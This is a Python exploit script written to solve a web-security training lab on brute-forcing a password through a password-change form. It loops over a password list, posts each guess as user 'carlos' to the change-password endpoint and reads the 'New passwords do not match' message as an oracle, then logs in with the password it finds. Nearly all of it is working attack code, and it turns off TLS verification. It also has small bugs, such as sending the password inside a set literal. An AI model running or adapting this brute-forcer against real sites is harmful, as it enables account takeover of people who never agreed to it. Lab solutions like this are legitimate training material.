"""
  Lab: Password brute-force via password change

  WHEN current_password is correct AND new passwords don't match => ('New passwords do not match')
  WHEN current_password is incorrect AND new passwords match => (Loged Out)
  WHEN current_password is incorrect AND new passwords don't match => ('Current password is incorrect')
  
  Step:
  1. Read password list
  2. Brute-force password using the Logic:
      if ('New passwords do not match') in password AND (new_password1 != new password2)
  3. Login as 'carlos'

  Author: D4mn20
"""
import argparse
from colorama import Fore

import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def main():
  parser = argparse.ArgumentParser()
  parser.add_argument('-u', "--url", required=True, help="Target URL (e.g.: https://vulnerableapp.com/)")
  parser.add_argument('--proxy', help="Web Proxy (e.g. 'http://127.0.0.1:8080')")
  args = parser.parse_args()

  print(f"{Fore.BLUE}Starting...{Fore.RESET}")
  session = requests.Session()
  if args.proxy:
    proxies = {
      "http": args.proxy,
      "https": args.proxy
    }
    session.proxies = proxies
  session.verify = False
  url = args.url.strip('/')

  print(f"{Fore.YELLOW}Step 1.{Fore.RESET} Reading password list...")
  passwords = read_passwords()
  if not passwords:
    print(f"{Fore.RED}Failed to read passwords list!{Fore.RESET}")
    exit(1)

  print(f"{Fore.YELLOW}Step 2.{Fore.RESET} Brute-forcing password...")
  password = brute_force_password(session, url, passwords)
  if not password:
    print(f"{Fore.RED}[-] Could not found the valid password to 'carlos' account!{Fore.RESET}")

  print(f"{Fore.YELLOW}Step 3.{Fore.RESET} Login as 'carlos'...")
  if login(session, url, password):
    print(f"{Fore.GREEN}[+] Lab Solved!{Fore.RESET}")

def read_passwords():
  try:
    with open('../passwords.txt', 'r') as file:
      return [line.strip() for line in file if line.strip()]
  except FileNotFoundError:
    print(f"{Fore.RED}[-] Password list file not found.{Fore.RESET}")
    exit(1)

def brute_force_password(session, url, passwords):
  for password in passwords:
    try:
      data = {
        "username": "carlos",
        "current-password": {password},
        "new-password-1": "password1",
        "new-password-2": "password2"
      }
      response = session.post(f"{url}/my-account/change-password", data=data, allow_redirects=False)

      if response.status_code == 200 and "New passwords do not match" in response.text:
        return password
      
    except Exception as e:
      print(f"{Fore.RED}[-] Failed to brute-force password.{Fore.RESET}")
      exit(1)
  return None

def login(session, url, password):
  try:
    response = session.post(f"{url}/login", data={"username": "carlos", "password": password})
    
    if response.status_code != 200:
      print(f"{Fore.RED}[-] Status code other than 200, see Burp Proxy history for better information{Fore.RESET}")
      return False
    
    return True
  
  except Exception as e:
    print(f"{Fore.RED}[-] Request error in change_password: {e}{Fore.RESET}")
    return False
  
if __name__ == "__main__":
  main()

